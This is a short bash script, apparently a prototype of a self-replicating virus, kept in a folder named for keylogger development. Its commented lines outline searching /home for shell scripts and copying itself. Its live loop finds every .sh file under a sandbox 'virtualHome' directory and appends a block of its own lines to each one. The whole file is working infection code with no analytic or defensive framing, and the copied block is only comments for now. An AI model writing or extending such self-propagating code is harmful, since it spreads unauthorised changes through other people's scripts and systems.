#!/bin/bash
#realstart
#start

# # finds shell files
# find /home -name "*.sh"

# # copies self
# touch fileData.txt
# head -n 9 writeSelf.sh | tail -n 7 > fileData.txt
# cat fileData.txt


#end
#realend


virtualhome='/home/jonesy/keylogger/codedev/noCron/virtualHome'
FILENUM=$(find $virtualhome -name "*.sh" | wc -l)
i=0
for (( i=1; i <= $FILENUM; i++ ));do
    TARGET=$(find $virtualhome -name "*.sh" | sed "${i}q;d")
    echo $TARGET
    head -n 9 writeSelf.sh | tail -n 7 >> $TARGET
done